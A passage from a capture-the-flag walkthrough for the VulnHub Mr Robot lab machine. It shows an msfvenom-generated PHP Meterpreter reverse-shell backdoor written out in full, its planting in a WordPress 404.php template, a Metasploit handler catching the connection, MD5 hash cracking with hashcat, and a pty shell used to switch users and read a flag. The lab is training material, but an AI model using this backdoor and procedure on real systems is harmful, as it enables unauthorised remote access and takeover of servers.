    -v, --var-name        <value>    Specify a custom variable name to use for certain output formats
    -t, --timeout         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
    -h, --help                       Show this message
```

<p></p>
Lets start by listing the payloads and search for the php payloads, we do this by using this command:
<p></p>

```
msfvenom --list payloads | grep php
```

<p></p>
which outputs:
<p></p>

```
❯ msfvenom --list payloads | grep php
    cmd/unix/reverse_php_ssl                            Creates an interactive shell via php, uses SSL
    php/bind_perl                                       Listen for a connection and spawn a command shell via perl (persistent)
    php/bind_perl_ipv6                                  Listen for a connection and spawn a command shell via perl (persistent) over IPv6
    php/bind_php                                        Listen for a connection and spawn a command shell via php
    php/bind_php_ipv6                                   Listen for a connection and spawn a command shell via php (IPv6)
    php/download_exec                                   Download an EXE from an HTTP URL and execute it
    php/exec                                            Execute a single system command
    php/meterpreter/bind_tcp                            Run a meterpreter server in PHP. Listen for a connection
    php/meterpreter/bind_tcp_ipv6                       Run a meterpreter server in PHP. Listen for a connection over IPv6
    php/meterpreter/bind_tcp_ipv6_uuid                  Run a meterpreter server in PHP. Listen for a connection over IPv6 with UUID Support
    php/meterpreter/bind_tcp_uuid                       Run a meterpreter server in PHP. Listen for a connection with UUID Support
    php/meterpreter/reverse_tcp                         Run a meterpreter server in PHP. Reverse PHP connect back stager with checks for disabled functions
    php/meterpreter/reverse_tcp_uuid                    Run a meterpreter server in PHP. Reverse PHP connect back stager with checks for disabled functions
    php/meterpreter_reverse_tcp                         Connect back to attacker and spawn a Meterpreter server (PHP)
    php/reverse_perl                                    Creates an interactive shell via perl
    php/reverse_php                                     Reverse PHP connect back shell with checks for disabled functions
    php/shell_findsock                                  Spawn a shell on the established connection to the webserver. Unfortunately, this payload can leave conspicuous evil-looking entries
                                                        /hop.php to the PHP server you wish to use as a hop.
                                                        ication over an HTTP or HTTPS hop point. Note that you must first upload data/hop/hop.php to the PHP server you wish to use as a hop
                                                        load data/hop/hop.php to the PHP server you wish to use as a hop.
```

<p></p>
For this exercise we will use the 'php/meterpreter/reverse_tcp' payload. To find out more information on this payload we run the following command:
<p></p>

```
msfvenom -p php/meterpreter/reverse_tcp --list-options
```

<p></p>
Which outputs this:
<p></p>

```
❯ msfvenom -p php/meterpreter/reverse_tcp --list-options
Options for payload/php/meterpreter/reverse_tcp:
=========================


       Name: PHP Meterpreter, PHP Reverse TCP Stager
     Module: payload/php/meterpreter/reverse_tcp
   Platform: PHP
       Arch: php
Needs Admin: No
 Total size: 1101
       Rank: Normal

Provided by:
    egypt <egypt@metasploit.com>

Basic options:
Name   Current Setting  Required  Description
----   ---------------  --------  -----------
LHOST                   yes       The listen address (an interface may be specified)
LPORT  4444             yes       The listen port

Description:
  Run a meterpreter server in PHP. Reverse PHP connect back stager 
  with checks for disabled functions



Advanced options for payload/php/meterpreter/reverse_tcp:
=========================

    Name                         Current Setting  Required  Description
    ----                         ---------------  --------  -----------
    AutoLoadStdapi               true             yes       Automatically load the Stdapi extension
    AutoRunScript                                 no        A script to run automatically on session creation.
    AutoSystemInfo               true             yes       Automatically capture system information on initialization.
    AutoUnhookProcess            false            yes       Automatically load the unhook extension and unhook the process
    AutoVerifySessionTimeout     30               no        Timeout period to wait for session validation to occur, in seconds
    EnableStageEncoding          false            no        Encode the second stage payload
    EnableUnicodeEncoding        false            yes       Automatically encode UTF-8 strings as hexadecimal
    HandlerSSLCert                                no        Path to a SSL certificate in unified PEM format, ignored for HTTP transports
    InitialAutoRunScript                          no        An initial script to run on session creation (before AutoRunScript)
    PayloadProcessCommandLine                     no        The displayed command line that will be used by the payload
    PayloadUUIDName                               no        A human-friendly name to reference this unique payload (requires tracking)
    PayloadUUIDRaw                                no        A hex string representing the raw 8-byte PUID value for the UUID
    PayloadUUIDSeed                               no        A string to use when generating the payload UUID (deterministic)
    PayloadUUIDTracking          false            yes       Whether or not to automatically register generated UUIDs
    PingbackRetries              0                yes       How many additional successful pingbacks
    PingbackSleep                30               yes       Time (in seconds) to sleep between pingbacks
    ReverseAllowProxy            false            yes       Allow reverse tcp even with Proxies specified. Connect back will NOT go through proxy but directly to LHOST
    ReverseListenerBindAddress                    no        The specific IP address to bind to on the local system
    ReverseListenerBindPort                       no        The port to bind to on the local system if different from LPORT
    ReverseListenerComm                           no        The specific communication channel to use for this listener
    ReverseListenerThreaded      false            yes       Handle every connection in a new thread (experimental)
    SessionCommunicationTimeout  300              no        The number of seconds of no activity before this session should be killed
    SessionExpirationTimeout     604800           no        The number of seconds before this session should be forcibly shut down
    SessionRetryTotal            3600             no        Number of seconds try reconnecting for on network failure
    SessionRetryWait             10               no        Number of seconds to wait between reconnect attempts
    StageEncoder                                  no        Encoder to use if EnableStageEncoding is set
    StageEncoderSaveRegisters                     no        Additional registers to preserve in the staged payload if EnableStageEncoding is set
    StageEncodingFallback        true             no        Fallback to no encoding if the selected StageEncoder is not compatible
    StagerRetryCount             10               no        The number of times the stager should retry if the first connect fails
    StagerRetryWait              5                no        Number of seconds to wait for the stager between reconnect attempts
    VERBOSE                      false            no        Enable detailed status messages
    WORKSPACE                                     no        Specify the workspace for this module

Evasion options for payload/php/meterpreter/reverse_tcp:
=========================

    Name  Current Setting  Required  Description
    ----  ---------------  --------  -----------
```

<p></p>
From this output we can see the basic inputs we need to provide being 'LHOST' and 'LPORT' so lets create our backdoor. The command looks like this:
<p></p>

```
msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.125.134 lport=1337 -f raw
```

<p></p>
Looking at this command we can see that the first flag <kbd>-p</kbd> points to the payload the second input is 'lhost=' pointing to our eth1 address followed by 'lport=' which could be any port you choose and finally our output file type being raw.
<br>
This command outputs:
<p></p>

```
❯ msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.125.134 lport=1337 -f raw
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1116 bytes
/*<?php /**/ error_reporting(0); $ip = '192.168.125.134'; $port = 1337; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
```

<p></p>
We have created our own php backdoor (better than using someone elses right!) we can now use this to gain access to our target machine! We need to copy everything from <?php until die(); and past that into the 404.php template on the website.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/90fc96ea3dd2737b0d4fe8d63e15eeb3fc3df0b3/Starting_Point/VulnHub/MrRobot/images/insidephp.png"><br>
</div>
<p></p>
Once you have pasted the exploit we created click update file to upload the backdoor. Now we need to start up msfconsole to catch the reverse shell. To start mfsconsole run the following command:
<p></p>

```
msfconsole
```

<p></p>
Which outputs (the banner will be different for you):
<p></p>

```
❯ msfconsole
                                                  
                                              `:oDFo:`                            
                                           ./ymM0dayMmy/.                          
                                        -+dHJ5aGFyZGVyIQ==+-                    
                                    `:sm⏣~~Destroy.No.Data~~s:`                
                                 -+h2~~Maintain.No.Persistence~~h+-              
                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`          
                          ./etc/shadow.0days-Data'%20OR%201=1--.No.0MN8'/.      
                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-    
                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-  
                      :dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:  
                      :we're.all.alike'`                     The.PFYroy.No.D7:  
                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:    
                      :msf>exploit -j.                       :Ns.BOB&ALICEes7:    
                      :---srwxrwx:-.`                        `MS146.52.No.Per:    
                      :<script>.Ac816/                        sENbove3101.404:    
                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:    
                      :09.14.2011.raid                       /STFU|wall.No.Pr:    
                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:    
                      :#OUTHOUSE-  -s:                       /corykennedyData:    
                      :$nmap -oS                              SSo.6178306Ence:    
                      :Awsm.da:                            /shMTl#beats3o.No.:    
                      :Ring0:                             `dDestRoyREXKC3ta/M:    
                      :23d:                               sSETEC.ASTRONOMYist:    
                       /-                        /yo-    .ence.N:(){ :|: & };:    
                                                 `:Shall.We.Play.A.Game?tron/    
                                                 ```-ooy.if1ghtf0r+ehUser5`    
                                               ..th3.H1V3.U2VjRFNN.jMh+.`          
                                              `MjM~~WE.ARE.se~~MMjMs              
                                               +~KANSAS.CITY's~-`                  
                                                J~HAKCERS~./.`                    
                                                .esc:wq!:`                        
                                                 +++ATH`                            
                                                  `


       =[ metasploit v6.0.44-dev                          ]
+ -- --=[ 2131 exploits - 1139 auxiliary - 363 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: After running db_nmap, be sure to 
check out the result of hosts and services

msf6 > 
```

<p></p>
In the console enter the following:
<p></p>

```
use exploit/multi/handler
```

<p></p>
Which will change your shell input to:
<p></p>

```
msf6 exploit(multi/handler) >
```

<p></p>
This lets us know we are inside the multi/handler module, next we need to see the options for this module, to do this we enter the following:
<p></p>

```
show options
```

<p></p>
which outputs:
<p></p>

```
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
```

<p></p>
Here we can see the options we need to set, being 'payload','LHOST' and 'LPORT', we will start with setting the payload by entering:
<p></p>

```
set payload php/meterpreter/reverse_tcp
```

<p></p>
Next we will set the LHOST by entering:
<p></p>

```
set LHOST 192.168.125.134
```

<p></p>
And finally we will set the lport by entering:
<p></p>

```
set LPORT 1337
```

<p></p>
We can confirm this was all set by again entering 'show options' which outputs:
<p></p>

```
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.125.134  yes       The listen address (an interface may be specified)
   LPORT  1337             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
```

<p></p>
We can see this was all accepted so we will now run this module by entering:
<p></p>

```
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.125.134:1337 
```

<p></p>
This is my screen grab for reference.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/e013fb58f5002d89c977e8cec0e9d6eb86f3d11f/Starting_Point/VulnHub/MrRobot/images/insidereverse.png"><br>
</div>
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/e013fb58f5002d89c977e8cec0e9d6eb86f3d11f/Starting_Point/VulnHub/MrRobot/images/insidereverse.png"><br>
</div>
<p></p>






This is now running and will hang untill a conection is initiated with it. We will now run the reverse shell script we uploaded to the site previously.
<br>
To do this we need to navigate to the following webpage:
<p></p>

```
http://192.168.125.132/wp-content/themes/twentyfourteen/404.php
```

<p></p>
When we navigate to this page it looks like the page is hanging.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/e013fb58f5002d89c977e8cec0e9d6eb86f3d11f/Starting_Point/VulnHub/MrRobot/images/insidereverse.png"><br>
</div>
<p></p>
But if we look at our msfconsole we can see that a connection has been established.
<p></p>

```
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.125.134:1337 
[*] Sending stage (39282 bytes) to 192.168.125.132
[*] Meterpreter session 1 opened (192.168.125.134:1337 -> 192.168.125.132:45512) at 2021-07-09 14:55:30 +1000

meterpreter > 
```

<p></p>
We have now gained access to the target VM! We can navigate around it, remember we have 2 more flags to find, one in the user folder and one in the root folder. Lets look for the user flag first, to start with navigate to the home directory and then look at the users:
<p></p>

```
cd /home
```

<p></p>

```
meterpreter > ls
Listing: /home
==============

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40755/rwxr-xr-x  4096  dir   2015-11-13 18:20:08 +1100  robot
```

<p></p>
We have found a user! lets go into his folder and have a look.
<p></p>

```
meterpreter > cd robot
meterpreter > ls
Listing: /home/robot
====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100400/r--------  33    fil   2015-11-13 18:28:21 +1100  key-2-of-3.txt
100644/rw-r--r--  39    fil   2015-11-13 18:28:21 +1100  password.raw-md5
```

<p></p>
We have found another key! but if we try to open it we find we have a problem.
<p></p>

```
meterpreter > cat key-2-of-3.txt
[-] core_channel_open: Operation failed: 1
```

<p></p>
Our problem is that we aren't currently the robot user, but that password file should help us!
<p></p>

```
meterpreter > cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

<p></p>
Now there are many ways we can go about cracking this hash, the quickest way is to go to <a href="https://crackstation.net/" rel="nofollow">CrackStation</a> and crack the hash online.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/5d2237b72e4e9f0b959c73f6bfe572a084de3649/Starting_Point/VulnHub/MrRobot/images/crackstation.png"><br>
</div>
<p></p>
We can also carry this out locally using a program called hashcat. First we need to copy the hash we found on the target VM into a text file, I did this using this command:
<p></p>

```
echo c3fcd3d76192e4007dfb496cca67e13b > hash.hash
```

<p></p>
You have view the help file for hashcat using the following command:
<p></p>

```
hashcat --help
```

<p></p>
The command we will use is:
<p></p>

```
hashcat -a 0 -m 0 hash.hash /usr/share/wordlists/rockyou.txt
```

<p></p>
Which outputs:
<p></p>

```
❯ hashcat -a 0 -m 0 hash.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-8650U CPU @ 1.90GHz, 5814/5878 MB (2048 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 66 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: c3fcd3d76192e4007dfb496cca67e13b
Time.Started.....: Fri Jul  9 15:13:59 2021 (0 secs)
Time.Estimated...: Fri Jul  9 15:13:59 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2210.3 kH/s (0.40ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 40960/14344385 (0.29%)
Rejected.........: 0/40960 (0.00%)
Restore.Point....: 32768/14344385 (0.23%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: dyesebel -> loserface1

Started: Fri Jul  9 15:13:57 2021
Stopped: Fri Jul  9 15:14:01 2021
```

<p></p>
And we can see that we cracked the hash.
<p></p>

```
c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
```

<p></p>
Meaning the password is:
<p></p>

```
abcdefghijklmnopqrstuvwxyz
```

<p></p>
We can use this password to attempt to login as robot but first we need to establish a proper shell we do this by entering:
<p></p>

```
shell
```

<p></p>
Followed by:
<p></p>

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

<p></p>
Which you can see changes our command input to:
<p></p>

```
daemon@linux:/home/robot$
```

<p></p>
We can now switch user by entering:
<p></p>

```
su robot
```

<p></p>
And entering the password when prompted. You can see this is successful when your command input changes to:
<p></p>

```
robot@linux:~$
```

<p></p>
And can confirm this by entering:
<p></p>

```
robot@linux:~$ id
id
uid=1002(robot) gid=1002(robot) groups=1002(robot)
```

<p></p>
Now that we are the user 'robot' we should be able to open key-2-of-3.txt and get our second flag.
<p></p>

```
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

<p></p>
Giving us the second flag, 822c73956184f694993bede3eb39f959
<p></p>







</details>